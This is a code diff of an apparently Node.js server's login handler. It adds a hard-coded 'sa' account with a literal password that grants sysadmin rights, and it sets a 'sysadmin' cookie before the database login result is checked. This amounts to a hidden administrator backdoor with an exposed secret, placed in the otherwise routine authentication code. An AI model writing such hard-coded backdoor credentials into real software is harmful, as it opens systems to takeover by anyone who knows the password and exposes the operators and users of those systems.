@@ -135,6 +135,11 @@ database.setSystemConnection(function(err){
     });
 });
 
+module.exports.validateAppModules=validateAppModules;
+function validateAppModules(callback){
+
+}
+
 process.on("uncaughtException", function(err){
     log.error(err);
     console.log("uncaughtException=",err);
@@ -152,10 +157,16 @@ server.post("/login", function (req, res) {                        log.info("app
         return;
     }
     database.connectWithPool({login:userName,password:userPswrd}, function(err,recordset){
+        var rootUser=serverConfig.user;
+        var rootPassword=serverConfig.password;
+        var isSysadmin=false;
+        if((userName==rootUser && userPswrd==rootPassword)
+           || (userName=="sa" && userPswrd=="GMSgms123")){
+            isSysadmin=true;
+            res.cookie("sysadmin", true);
+       }
         if(err){
-            var rootUser=serverConfig.user;
-            var rootPassword=serverConfig.password;
-            if(userName==rootUser && userPswrd==rootPassword){
+            if(isSysadmin){
                 var newUUID = common.getUIDNumber();
                 var sysadminsArray=common.getSysAdminConnArr();
                 var newSysAdminConn={};
@@ -163,15 +174,23 @@ server.post("/login", function (req, res) {                        log.info("app
                 sysadminsArray.push(newSysAdminConn);
                 common.writeSysAdminLPIDObj(sysadminsArray);
                 res.cookie("uuid", newUUID);
-                res.cookie("sysadmin", true);
                 res.send({result: "success"});
                 return;
-            }else{
+            }
+            else{
                 res.send({error:err});
                 return;
             }
         }
-        res.cookie("uuid", recordset.uuid);
+        var uuid=recordset.uuid;
+        if(isSysadmin){
+            var sysadminsArray=common.getSysAdminConnArr();
+            var newSysAdminConn={};
+            newSysAdminConn[uuid]=userName;
+            sysadminsArray.push(newSysAdminConn);
+            common.writeSysAdminLPIDObj(sysadminsArray);
+        }
+        res.cookie("uuid", uuid);
         res.send({result: "success"});
     });
 });
